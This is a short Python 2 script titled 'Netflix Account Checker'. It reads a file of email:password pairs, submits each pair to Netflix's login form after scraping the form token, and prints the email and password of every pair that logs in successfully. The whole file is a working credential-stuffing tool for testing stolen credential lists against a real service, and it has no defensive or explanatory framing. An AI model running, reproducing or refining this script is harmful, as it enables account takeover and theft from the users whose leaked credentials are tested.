#!/usr/bin/env python
# coding=utf-8

try:
	import requests
	import sys, os
	import os.path
	import argparse
	from BeautifulSoup import BeautifulSoup as Soup

except ImportError:
	print "Requirements: 'requests', 'BeautifulSoup'"

parser = argparse.ArgumentParser(prog='Netflix Account Checker')
parser.add_argument("file", help="Location of the txt", type=str)
args = parser.parse_args()

def main(args):
	
	if (len(sys.argv) < 1) | (len(sys.argv) > 2):
			print "You are missing args, use -h for help"
			sys.exit()

	credFile = args.file
	checkFile(credFile)
	lines = open(credFile, "r")
	line = list(credFile)
	
	for line in lines:
		email=line.split(":")[0]
		password=line.split(":")[1]
		checkPassword(email,password)

def checkPassword(email,password):
	s = requests.Session()
	s.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0'})
	login = s.get("https://www.netflix.com/nl-en/Login")
	soup=Soup(login.text)

	loginForm = soup.find('form')
	authURL = loginForm.find('input', {'name': 'authURL'}).get('value')
	requestToNetflix = s.post("https://www.netflix.com:443/Login", headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.netflix.com/Login", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}, data={"email": (email), "password": (password), "rememberMeCheckbox": "true", "flow": "websiteSignUp", "mode": "login", "action": "loginAction", "withFields": "email,password,rememberMe,nextPage", "authURL": (authURL), "nextPage": "https://www.netflix.com/browse"})

	logged = requestToNetflix.text.find('name="authURL"')

	if logged == -1:
		print"Working account!","Email: "+email+" Password: "+password
	 
def checkFile(credFile):
	if not os.path.exists(credFile):
		print "File not Found"
		sys.exit()	

main(args)
sys.exit()
